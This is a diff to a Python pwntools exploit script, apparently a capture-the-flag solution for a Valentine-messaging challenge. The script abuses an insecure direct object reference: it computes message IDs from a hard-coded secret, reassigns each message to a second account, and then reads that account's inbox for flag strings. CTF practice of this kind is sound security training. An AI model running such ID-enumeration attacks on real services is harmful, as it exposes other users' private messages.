@@ -5,6 +5,7 @@ import sys
 import random
 import string
 import re
+import hashlib
 
 def randstr(n=8):
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
@@ -48,22 +49,19 @@ io.sendlineafter(b"Password: ", pass1.encode())
 # =========================
 # Try IDOR on message IDs
 # =========================
-def change_recipient(msg_id):
+server_secret = "love_is_eternal_2026"
+id_count=500
+pool = []
+for i in range(id_count):
+    data = f"{server_secret}:{i}:pool"
+    digest = hashlib.sha256(data.encode()).hexdigest()
+    id_val = int(digest[:8], 16) % 1_000_000 + 1
+    pool.append(id_val)
+for msg_id in pool:
     # Change recipient
     io.sendlineafter(b"> ", b"4")
     io.sendlineafter(b"Valentine ID: ", str(msg_id).encode())
     io.sendlineafter(b"New recipient username: ", user2.encode())
-
-    return io.recvuntil(b"6. Logout\n")
-    
-msg_id = 1
-while True:
-    data = change_recipient(msg_id)
-
-    if b"Valentine not found!" in data:
-        break
-
-    msg_id += 1
 # =========================
 # Logout User1
 # =========================
@@ -80,7 +78,12 @@ io.sendlineafter(b"Password: ", pass2.encode())
 # View inbox
 # =========================
 io.sendlineafter(b"> ", b"2")
-data = io.recvall(timeout=3)
-print(data.decode(errors="ignore"))
+data = io.recvall(timeout=3).decode(errors="ignore")
+texts = re.findall(r'Text:\s*(.+)', data)
 
+for t in texts:
+    t = t.strip()
+    if len(t) == 32:
+        print("Found flags:")
+        print(t)
 io.close()
